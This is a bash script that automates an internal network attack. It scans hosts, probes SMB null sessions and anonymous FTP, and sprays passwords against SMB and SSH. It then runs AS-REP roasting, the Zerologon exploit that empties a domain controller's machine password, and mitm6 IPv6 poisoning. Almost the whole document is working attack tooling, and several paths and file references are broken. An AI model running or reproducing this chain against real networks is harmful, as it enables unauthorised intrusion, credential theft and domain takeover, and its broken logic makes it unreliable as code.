#!/bin/bash

if ! test -d mitm6; then git clone https://github.com/dirkjanm/mitm6.git; fi
if ! test -d zerologon; then git clone https://github.com/risksense/zerologon.git; fi
if ! test -d impacket; then git clone https://github.com/fortra/impacket.git; fi

mkdir -p Outputs
mkdir -p temp


#Target Scanning------------------------------------


function Long() {
Count=$(wc -l targets.txt | awk '{print $1}')
LineCount=$(echo $Count)

per25=$(echo $((LineCount*25/100)))
per26=$(echo $((per25 + 1)))
per50=$(echo $((LineCount*50/100)))
per51=$(echo $((per50 + 1)))
per75=$(echo $((LineCount*75/100)))
per76=$(echo $((per75 + 1)))
per100=$(echo $((LineCount*100/100)))
per101=$(echo $((per100 + 1)))

nawk -v l1=0 -v l2=$per26 '{if((NR>l1)&&(NR<l2)) print}' targets.txt > temp/25tar
nawk -v l1=$per25 -v l2=$per51 '{if((NR>l1)&&(NR<l2)) print}' targets.txt > temp/50tar
nawk -v l1=$per50 -v l2=$per76 '{if((NR>l1)&&(NR<l2)) print}' targets.txt > temp/75tar
nawk -v l1=$per75 -v l2=$per101 '{if((NR>l1)&&(NR<l2)) print}' targets.txt > temp/100tar


echo 'Scanning Hosts'
nmap -n -sn -iL temp/25tar -oG - | awk '/Up$/{print $2}' > temp/Int_LH
nmap -iL temp/25tar > Outputs/Scanned-Hosts
echo '25 Percent Done'
nmap -n -sn -iL temp/50tar -oG - | awk '/Up$/{print $2}' >> temp/Int_LH
nmap -iL temp/50tar >> Outputs/Scanned-Hosts
echo '50 Percent Done'
nmap -n -sn -iL temp/75tar -oG - | awk '/Up$/{print $2}' >> temp/Int_LH
nmap -iL temp/75tar >> Outputs/Scanned-Hosts
echo '75 Percent Done'
nmap -n -sn -iL temp/100tar -oG - | awk '/Up$/{print $2}' >> temp/Int_LH
nmap -iL temp/100tar >> Outputs/Scanned-Hosts
echo 'Scanning Complete'

Livehits=$(wc -l temp/Int_LH)
LiveHits=$(echo $Livehits | awk '{print $1}')
echo $LiveHits 'Live IPs Found'
}


function Few() {
nmap -n -sn -iL targets.txt -oG - | awk '/Up$/{print $2}' >> temp/Int_LH
}


Current=$(wc -l targets.txt | awk '{print $1}')

if [ "$Current" -gt 4 ]; then
        Long
else
        Few
fi


#SMB Details--------------------------------------------


echo 'Checking for open ports 139 and/or 445'

crackmapexec smb temp/Int_LH > temp/Raw
# - IP-and-Build-info
cat temp/Raw | awk '{print $2}' > temp/SMB-IPs

echo 'Testing For Authentication Bypass'

crackmapexec smb temp/UsableIPs -u '' -p '' --local-auth | awk '!/[[*]]/ {print}' > temp/Raw-AuthBypass
cat temp/Raw-AuthBypass | awk '/[[+]]/ {print}' > Outputs/AuthBypass-Proof
cat temp/Raw-AuthBypass | awk '/[[+]]/ {print $2}' > Outputs/AuthBypass

echo 'Grabing Shares'

touch Outputs/Shares
echo '--------------------------------------------------    Shares        Permissions       Remark    -------------------------------------------' > Outputs/Shares
crackmapexec smb temp/SMB-IPs -u '' -p '' --shares | awk '!/[[*]]/{print}' | awk '!/[[-]]/{print}' | awk '!/[[+]]/{print}' | awk '!/-----/{print}' | awk '!/Share/{print}' | sort -n >> Outputs/Shares
crackmapexec smb temp/SMB-IPs -u Spray/SMB-Users -p Spray/SMB-Pws --shares | awk '!/[[*]]/{print}' | awk '!/[[-]]/{print}' | awk '!/[[+]]/{print}' | awk '!/-----/{print}' | awk '!/Share/ {print}' | sort -n >> Outputs/Shares
crackmapexec smb temp/SMB-IPs -u Names -p Spray/SMB-Pws --shares | awk '!/[[*]]/{print}' | awk '!/[[-]]/{print}' | awk '!/[[+]]/{print}' | awk '!/-----/{print}' | awk '!/Share/ {print}' | sort -n >> Outputs/Shares

echo 'Posting SMB Results'

cat temp/Raw | sed 's/^.*signing:/signing:/'  | sed -e 's/)\(.*\)/\1/' | awk '{print $1}' > temp/Just-Signing
cat temp/Raw | sed 's/^.*SMBv1:/SMBv1:/'  | sed -e 's/)\(.*\)/\1/' | awk '{print $1}' > temp/Just-SMBv1
paste temp/SMB-IPs temp/Just-Signing > temp/Just-SMB-Signing
paste temp/Just-SMB-Signing temp/Just-SMBv1 > Outputs/SMB-Proof
cat Outputs/SMB-Proof | awk '/signing:False/ {print $1}' > Outputs/SMB-Signing-False
cat Outputs/SMB-Proof | awk '/SMBv1:True/ {print $1}' > Outputs/SMB-SMBv1-True

echo 'Posting Domains'

cat temp/Raw | sed 's/^.*domain://' | sed -e 's/)\(.*\)/\1/' | awk '{print $1}' > temp/Just-Domains
paste temp/SMB-IPs temp/Just-Domains > Outputs/Domains


#FTP-anon-------------------------------------------------------


echo 'Checking for FTP-Anonymous'

nmap -sV -p 20-21 --script ftp-anon -iL temp/Int_LH -oG - | awk '/open/ {print $2}' > Outputs/FTP-Anon-Enabled
nmap -p 21 --script ftp-anon -iL Outputs/FTP-Anon-Enabled > Outputs/FTP-Anon-Proof


#Telnet------------------------------------------------


echo 'Getting Telnet Info'

nmap -n -sV -Pn --script "*telnet* and safe" -p 23 -iL targets.txt -oG - | awk '/open/ {print}' > Outputs/Telnet


#SSH Password Spraying------------------------------------


echo 'Testing SSH for Default Credentials'

crackmapexec ssh temp/Int_LH | awk '{print $2}' > temp/SSH-IPs

crackmapexec ssh temp/SSH-IPs -u Spray/SSH-Users -p Spray/SSH-Pws | awk '/[[+]]/ {print}' | awk '{print $2}' | sort -n > Outputs/SSH-BadPass
crackmapexec ssh Outputs/SSH-BadPass -u Spray/SSH-Users -p Spray/SSH-Pws  -x 'ls' | sort -n > Outputs/SSH-BadPass-Proof


#Ike Scanning--------------------------------------------

#echo 'Ike Scanning'

#nmap -sU -p 500 -iL Int_LH -oG - | awk '/open/ {print $2}' > temp/Ike-IPs
#ike-scan -f Ouputs/Ike


#Impacket-------------------------------------------------


Dom=$(grep "[net]" Outputs/Domains | sort | uniq | head -n 1 | awk '{print $2}')
ImpacketDomain=$(echo $Dom)
echo 'Running Impacket against domain' $ImpacketDomain

cd impacket/examples
python3 GetNPUsers.py -usersfile ../../Names -no-pass $ImpacketDomain > Outputs/Impacket-Results


#Zerologon-------------------------------------------------


echo 'Running Zerologon'
DomC=$(grep "[net]" temp/Raw | awk '/DC/ {print}' | sort | uniq | head -n 1 | awk '{print $4}')
DC=$(echo $DomC)

DomCIP=$(grep "[net]" temp/Raw | awk '/DC/ {print}' | sort | uniq | head -n 1 | awk '{print $2}')
DCIP=$(echo $DomCIP)
echo 'Testing' $DC $DCIP

cd zerologon
python3 set_empty_pw.py $DC $DCIP > Outputs/Zerologon > Outputs/Zerologon-Results



#Mitm6 IPv6---------------------------------------------------


echo 'Running Mitm6'

Get=$(grep "[net]" temp/Just-Domains | sort | uniq | head -n 1)
Domain=$(echo $Get)

function killtask() {
sleep 5m
Killmitm6=$(ps aux | grep python | awk '/mitm6/ {print $2}')
echo $Killmitm6
kill $Killmitm6
}

cd mitm6/mitm6
python3 mitm6.py -d $Domain & killtask &
wait
